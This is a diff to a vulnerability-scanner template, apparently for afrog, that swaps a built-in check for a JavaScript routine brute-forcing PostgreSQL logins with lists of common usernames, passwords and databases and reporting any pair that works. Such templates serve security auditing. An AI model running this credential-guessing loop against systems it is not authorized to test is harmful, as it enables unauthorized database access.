@@ -6,7 +6,7 @@ info:
   severity: high
   verified: true
   description: |-
-    PostgreSQL weak credentials were discovered (dictionary brute-force in go).
+    PostgreSQL weak credentials were discovered (dictionary brute-force in javascript).
   tags: network,postgresql,default-login,weak-login
   requires: [postgresql]
   created: 2026/01/17
@@ -14,8 +14,46 @@ info:
 rules:
   r0:
     request:
-      type: go
-      data: postgresql-weak-login
+      type: javascript
+      code: |
+        var pg = require("afrog/postgres");
+
+        var port = /^[0-9]+$/.test(String(Port)) ? Port : "5432";
+
+        var usernames = ["postgres", "admin", "root", "test", "user", "pgsql"];
+        var passwords = ["postgres", "123456", "password", "12345678", "admin", "root", "test", "12345", "pgsql"];
+        var databases = ["postgres", "template1"];
+
+        var tried = 0;
+        var result = "";
+
+        for (var i = 0; i < usernames.length && result === ""; i++) {
+          for (var j = 0; j < passwords.length && result === ""; j++) {
+            for (var k = 0; k < databases.length; k++) {
+              tried++;
+              var c = pg.PostgresClient();
+              c.SetTimeout(3);
+              if (!c.Connect(Host, port)) {
+                result = "fail;reason=connect_failed;tried=" + tried;
+                break;
+              }
+              var ok = c.Login(usernames[i], passwords[j], databases[k]);
+              c.Close();
+              if (ok) {
+                result = "success;user=" + usernames[i] + ";pass=" + passwords[j] + ";db=" + databases[k];
+                break;
+              }
+            }
+          }
+        }
+
+        if (result === "") {
+          result = "fail;reason=not_found;tried=" + tried;
+        }
+        Export(result);
+      args:
+        Host: "{{Host}}"
+        Port: "{{Port}}"
     expression: response.raw.bcontains(b"success;")
     extractors:
       - type: regex
